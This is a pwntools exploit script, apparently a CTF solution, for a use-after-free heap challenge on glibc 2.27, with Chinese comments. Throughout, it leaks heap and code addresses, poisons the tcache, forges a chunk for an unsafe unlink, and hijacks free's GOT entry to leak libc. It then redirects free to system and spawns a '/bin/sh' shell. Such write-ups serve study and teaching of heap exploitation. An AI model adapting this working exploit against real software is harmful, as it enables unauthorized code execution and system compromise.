#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF27-16')
libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./UAF27-16')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(idx,length):
	p.sendlineafter(':','1')
	p.sendlineafter('idx:',str(idx))
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

p.sendafter('Enter your favorite sentence:\n','1234')
p.sendlineafter('Enter your cookie:\n','287454020')
MysteriousXOR = int(p.recvline('\n'),16)
MysteriousXOR2 = int(p.recvline('\n'),16)

heapbase = (MysteriousXOR ^ 287454020) - 0x250
point_sentence_chunk = MysteriousXOR ^ MysteriousXOR2
codebase = point_sentence_chunk - 0x2020f0
node = point_sentence_chunk - 0x30
free_got = elf.got['free'] + codebase
puts_got = 0x202020 + codebase
puts_plt = 0x820 + codebase

pr('heapbase',heapbase)
pr('point_sentence_chunk',point_sentence_chunk)
pr('node',node)

add(0,0x80) #0 0x290
add(1,0x80) #1 0x320
add(2,0x30) #2 0x3b0
add(3,0x48) #3 0x3f0 unlink目标
add(4,0x88) #4 0x440
add(5,0x30) #5 0x4d0

#填满tcachebin
for i in [1,0,1,0,1,0,1]:
	delete(i)
	edit(i, p64(0))
delete(0) #放入unsortedbin

edit(1, p64(heapbase+0x440))
add(1,0x80) #chunk0
edit(1, p64(heapbase+0x440))
add(0,0x80) #分配去 chunk4 地址处

#unlink
point_chunk3 = node + 0x18
target = point_chunk3
fd = target - 0x18
bk = target - 0x10
fake_chunk = p64(0) + p64(0x40)
fake_chunk += p64(fd) + p64(bk)
edit(3, fake_chunk)

edit(0, p64(0x40)+p64(0x90)) #修改chunk4 pre,inuse
#填满tcachebin
for i in [4,1]:
	delete(i)
	edit(i, p64(0))

#fake_chunk 与 chunk4 合并, 发生unlink:所以 chunk3 指针修改为 point_chunk3 - 0x18 即为 node
delete(4)

payload = p64(free_got) + p64(puts_got) #chunk0 chunk1
edit(3, payload)

edit(0, p64(puts_plt)) # 修改 free 中 got 的内容为 puts_plt
#gdb.attach(p)
#pause()
delete(1) # 此时的效果即为 puts(puts_got)
puts_addr = u64(p.recv(6).ljust(8, "\x00"))
pr('puts_addr',puts_addr)
libcbase = puts_addr - libc.sym['puts']
system = libcbase + libc.sym['system']
pr('libcbase',libcbase)

edit(0, p64(system))
edit(2, '/bin/sh')
delete(2)

p.interactive()
